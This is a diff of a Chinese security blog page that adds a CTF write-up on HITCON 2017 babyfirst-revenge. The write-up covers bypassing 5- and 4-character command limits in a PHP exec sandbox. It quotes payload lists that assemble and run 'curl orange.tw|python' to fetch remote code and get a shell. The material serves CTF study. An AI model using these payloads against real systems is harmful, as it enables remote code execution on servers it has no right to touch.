@@ -4,12 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="asfh, Joker">
-    <meta name="description" content="
-版权声明：
-除非注明，本博文章均为原创，转载请以链接形式标明本文地址。
-
-">
+    <meta name="keywords" content="命令执行绕过, Joker">
+    <meta name="description" content="0x01 HITCON 2017 babyfirst-revenge最近比遇到一个关于四字符getshell的问题，就把这道题目拿过来分析一下v1代码：
+&amp;lt;?php
+    $sandbox = &#39;/www/sandbox/&#39; . m">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>asfh | Joker</title>
+    <title>命令执行绕过 | Joker</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -307,12 +305,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">asfh</h1>
+                    <h1 class="description center-align post-title">命令执行绕过</h1>
                 </div>
             </div>
         </div>
@@ -450,7 +448,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    30
+                    1.2k
                 </div>
                 
 
@@ -463,7 +461,141 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <hr>
+                <h2 id="0x01-HITCON-2017-babyfirst-revenge"><a href="#0x01-HITCON-2017-babyfirst-revenge" class="headerlink" title="0x01 HITCON 2017 babyfirst-revenge"></a>0x01 HITCON 2017 babyfirst-revenge</h2><p>最近比遇到一个关于四字符getshell的问题，就把这道题目拿过来分析一下<br>v1代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>看代码是需要5个字符去绕过然后执行命令，关于linux命令限制突破，在P神的<a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">《小密圈里的那些奇技淫巧》</a>早就有提到过，通过拆分来getshell<br>知识点：</p>
+<ol>
+<li>网络上下载文件的命令：curl、GET、wget</li>
+<li><strong>linux可以利用<code>\</code>换行续写</strong></li>
+<li>linux<code>&gt;</code>重定向,<code>&gt;</code>覆盖原有内容<code>&gt;&gt;</code>追加内容</li>
+<li><strong>文件中的命令错误不影响之后命令的执行</strong></li>
+<li>还有就是<code>ls</code>的<strong>排序问题</strong>，默认的排序方式显示符号再是数字，最后按字母顺序【注意，字母是<code>aAbB</code>这种顺序，即字母序】，而<code>ls -t</code>又超出长度限制，这就导致不得不考虑排序问题<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313000138.png" alt></li>
+</ol>
+<p>这样的话题目思路就很清晰了，通过拆分通过拆分payload写入文件来执行远程VPS上的文件</p>
+<p>目前拆分思路：</p>
+<ol>
+<li>先将<code>ls -t</code>写进一个文件，再按照时间顺序来写入payload，最后分别执行两个文件【官方payload】如下：</li>
+</ol>
+<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>
+    <span class="token string">'>ls\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'ls>_'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>\ \\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>-t\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>\>g'</span><span class="token punctuation">,</span> 
+    <span class="token string">'ls>>_'</span><span class="token punctuation">,</span> 
+
+    <span class="token comment" spellcheck="true"># generate `curl orange.tw|python`</span>
+    <span class="token string">'>on'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>th\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>py\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>\|\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>tw\\'</span><span class="token punctuation">,</span>
+    <span class="token string">'>e.\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>ng\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>ra\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>o\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>\ \\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>rl\\'</span><span class="token punctuation">,</span> 
+    <span class="token string">'>cu\\'</span><span class="token punctuation">,</span> 
+
+    <span class="token comment" spellcheck="true"># exec</span>
+    <span class="token string">'sh _'</span><span class="token punctuation">,</span> 
+    <span class="token string">'sh g'</span><span class="token punctuation">,</span> 
+<span class="token punctuation">]</span></code></pre>
+<ol start="2">
+<li><p>直接按照顺序写，当遇到后面的优先级比前面的大的时候可以先将前面的命令写入文件，再利用<code>rm</code>命令删除，最后的时候再利用<code>&gt;&gt;</code>来追加【其实第一种也要用到这个思路】<br>【例子如下，取自<a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">payload</a>】</p>
+<pre class=" language-python"><code class="language-python">build <span class="token operator">=</span> <span class="token punctuation">[</span>'<span class="token operator">></span>cur\'<span class="token punctuation">,</span>
+      '<span class="token operator">></span>l \'<span class="token punctuation">,</span>
+      <span class="token string">'ls>A'</span><span class="token punctuation">,</span>
+      <span class="token string">'rm c*'</span><span class="token punctuation">,</span>
+      <span class="token string">'rm l*'</span><span class="token punctuation">,</span>
+      '<span class="token operator">></span><span class="token number">105</span>\'<span class="token punctuation">,</span>
+      '<span class="token operator">></span><span class="token number">304</span>\'<span class="token punctuation">,</span>
+      '<span class="token operator">></span><span class="token number">301</span>\'<span class="token punctuation">,</span>
+      '<span class="token operator">></span><span class="token number">9</span><span class="token operator">></span>\'<span class="token punctuation">,</span>
+      <span class="token string">'ls>>A'</span><span class="token punctuation">,</span>
+      <span class="token string">'sh A'</span><span class="token punctuation">,</span>
+      <span class="token string">'php A'</span>
+      <span class="token punctuation">]</span></code></pre>
+<p>V1到这就没什么好说的了，再看V2：<br>代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+ <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+ @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span>
+ @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span>
+ <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+ <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span>
+ <span class="token punctuation">}</span>
+ <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span>
+</code></pre>
+</li>
+</ol>
+<pre><code>限制到了4个字符，首先，禁用了`&gt;&gt;`追加，在就是导致我们没法利用`rm`,即第二种拆分思路已经失效，只能采取第一种，而这就又有一个问题，那就是`ls -t`的拆分，无论怎么拆都满足不了字母序的条件。
+下面就是这道题目的知识点了：
+1. dir命令：dir等于ls -C -b;也就是说，默认情况下，文件列在列中，垂直排序，特殊字符由反斜杠转义序列表示。和ls基本一样，但是好出就是dir是d开头字典序在前。
+2. rev命令：将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。
+3. 还有就是`*`，这就是最有趣的地方了，`*`再linux中代表任意个数的通配符，但是如果单单只输入一个`*`的时候就类似于`$(dir *)`
+    ![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313013049.png)
+
+综上的话，思路就有了：思路就是V1思路的第一思路，重点在于如何写入`ls -t&gt;f`，有了上面的知识点，我们可以构造`dir f&gt; t- sl`【d的字母序必须再最前】,然后通过`*&gt;v`执行并重定向给`v`，在创建一个`rev`文件，然后通过 `*v&gt;g`执行`rev v`来将`ls -t&gt;f`写入g中
+
+再操作期间发现t的字母序要再s的后面，这就导致不能达成上面的条件
+![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313015518.png)
+解决方法是加多一个参数，例如h，ls只带参数h的不带参数l话那这个参数是毫无意义的，把t-换成ht-后成功满足
+![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313020234.png)
+在之后就是V1的思路了
+
+【官方payload】
+
+```python
+payload = [
+    # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;
+    &#39;&gt;dir&#39;, 
+    &#39;&gt;sl&#39;, 
+    &#39;&gt;g\&gt;&#39;,
+    &#39;&gt;ht-&#39;,
+    &#39;*&gt;v&#39;,
+
+    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;
+    &#39;&gt;rev&#39;,
+    &#39;*v&gt;x&#39;,
+
+    # generate &quot;curl orange.tw|python;&quot;
+    &#39;&gt;\;\\&#39;, 
+    &#39;&gt;on\\&#39;, 
+    &#39;&gt;th\\&#39;, 
+    &#39;&gt;py\\&#39;, 
+    &#39;&gt;\|\\&#39;, 
+    &#39;&gt;tw\\&#39;,
+    &#39;&gt;e.\\&#39;, 
+    &#39;&gt;ng\\&#39;, 
+    &#39;&gt;ra\\&#39;, 
+    &#39;&gt;o\\&#39;, 
+    &#39;&gt;\ \\&#39;, 
+    &#39;&gt;rl\\&#39;, 
+    &#39;&gt;cu\\&#39;, 
+
+    # got shell
+    &#39;sh x&#39;, 
+    &#39;sh g&#39;, 
+]</code></pre><p>参考文章：</p>
+<ul>
+<li><a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">如何绕过四个字符限制getshell</a></li>
+<li><a href="https://xz.aliyun.com/t/1579" target="_blank" rel="noopener">HITCON 2017 babyfirst-revenge(-v2)浅析</a></li>
+</ul>
+<hr>
 <p>版权声明：</p>
 <p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p>
 <hr>
@@ -492,7 +624,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://blog.j0k3r.cn/2225585209.html">http://blog.j0k3r.cn/2225585209.html</a>
+                    <a href="http://blog.j0k3r.cn/1877436815.html">http://blog.j0k3r.cn/1877436815.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -539,7 +671,7 @@
 <div id="article-share">
     
     
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="twitter,facebook,qq,qzone,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -572,23 +704,24 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/4269069721.html">
+                <a href="/4215173263.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="asfhasfasfasf">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一道CTF的trick分析">
                         
-                        <span class="card-title">asfhasfasfasf</span>
+                        <span class="card-title">一道CTF的trick分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-版权声明：
-除非注明，本博文章均为原创，转载请以链接形式标明本文地址。
-
-
+                            题目代码代码如下：
+&lt;?php
+$url = $_POST['url'];
+if (filter_var($url, FILTER_VALIDATE_URL)) {
+    var_dump($url);
+    if (preg_m
                         
                     </div>
                     <div class="publish-info">
@@ -610,26 +743,28 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2225585209.html">
+                <a href="/3264988010.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="asfh">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="PHP伪协议分析">
                         
-                        <span class="card-title">asfh</span>
+                        <span class="card-title">PHP伪协议分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-版权声明：
-除非注明，本博文章均为原创，转载请以链接形式标明本文地址。
-
-
+  
+  
+    Please enter the password to read.
+    
+  
+  182006207700fc149fec831c9ae039745426c83a0620631d4a87de529b8b9e53
                         
                     </div>
                     <div class="publish-info">
@@ -644,7 +779,14 @@
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+                        <span class="chip bg-color">php伪协议</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -828,7 +970,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">90</span>&nbsp;字
+                class="white-color">1.8k</span>&nbsp;字
             
             
             
@@ -955,11 +1097,9 @@ $(function () {
     
 
     
-    
-    <script type="text/javascript" size="150" alpha='0.6'
-        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
-    
 
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
     
     
     
